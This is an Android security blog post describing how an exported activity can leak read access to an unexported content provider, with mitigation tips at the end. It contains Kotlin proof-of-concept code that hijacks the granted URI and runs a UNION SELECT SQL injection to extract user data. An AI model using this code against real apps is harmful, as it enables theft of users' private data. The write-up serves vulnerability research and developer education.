![Cover Image](https://cdn.hashnode.com/res/hashnode/image/upload/v1738514771508/85664ef1-3d3d-4444-8e91-0b60ef64e867.jpeg)

It is not uncommon for content providers to be unexported in inter-process communication (IPC), as the data they manage is often intended to remain internal to the application. One might assume that attempting to interact with such providers would be a waste of time. But is it really?

Often, content providers are accessed by activities, which may, in turn, construct intents for other activities to interact with these providers. This can create unintended access points for attackers.

Let’s look at an example. A typical use case occurs when a search function, located in an exported activity, queries an internal content provider and then returns the result to the requesting activity.

The provider below is clearly not accessible by other (potentially malicious) apps:

```xml
<provider
            android:name="com.victim.app.InternalProvider"
            android:enabled="true"
            android:exported="false"
            android:authorities="com.victim.app.authority"
            android:grantUriPermissions="true"/>
```

At first glance, one might see `exported="false"` and move on. However, this is where things become interesting:

```xml
<activity
            android:name="com.victim.app.activities.ExposedActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="com.victim.app.SEARCH_PRIVATE_STUFF"/>
            </intent-filter>
        </activity>
```

The `onCreate` method provides further insight into how this activity is used:

```java
    @Override 
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        ...
       
        if (intent.getAction() == null || !intent.getAction().equals("com.victim.app.SEARCH_PRIVATE_STUFF")) {
             return;
         }
         intent.setData(Uri.parse("content://com.victim.app.authority/searchTable"));
         intent.addFlags(1);
         setResult(-1, intent);
         finish();
         return;
      
        ...
    }
```

This activity listens for the action `com.victim.app.SEARCH_PRIVATE_STUFF`. When triggered, it sets the data to `content://com.victim.app.authority/searchtable` and grants read permissions to the calling activity using `addFlags(1)`, which corresponds to `FLAG_GRANT_READ_URI_PERMISSION`.

## Proof of Concept

Since the activity is exported and we know the necessary parameters for execution, we can craft a PoC attack to invoke `com.victim.app.activities.ExposedActivity` and retrieve its data externally:

```kotlin
 val intent = Intent("com.victim.app.SEARCH_PRIVATE_STUFF").apply {
    setComponent(
        ComponentName(
            "com.victim.app",
            "com.victim.app.activities.ExposedActivity"
        )
    )
}

startActivityIntent.launch(intent)
```

If the attack is successful, the intent’s `data` field will contain the query URI, along with the permissions required to access the provider. In my original case, the content provider itself was vulnerable to SQL injection, making the attack even more dangerous. The following query was executed via the content resolver:

```kotlin
var startActivityIntent: ActivityResultLauncher<Intent> = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->

        Log.d("ActivityResult", ":$result")
        val incomingIntent = result.data
        val uri = incomingIntent?.data ?: return@registerForActivityResult

        val cursor: Cursor? = contentResolver.query(
            uri,
            null,
            "field=someField UNION SELECT otherTableField1, otherTableField2, otherTableField3, otherTableField4 from Note where userId='<user-id>'",
            null,
            null
        )

        cursor?.close()
    }
```

With this simple PoC, we were able to extract all user data stored in the app.

### Mitigation Strategies

Developers must be cautious when exposing activities that interact with sensitive data. A few suggestions to avoid such situations could be:

1. **Reconsider if such activities should be exposed.**
    
2. **Implement Signature-Level Permissions on the Activity** so that third party apps won’t be able to contact them.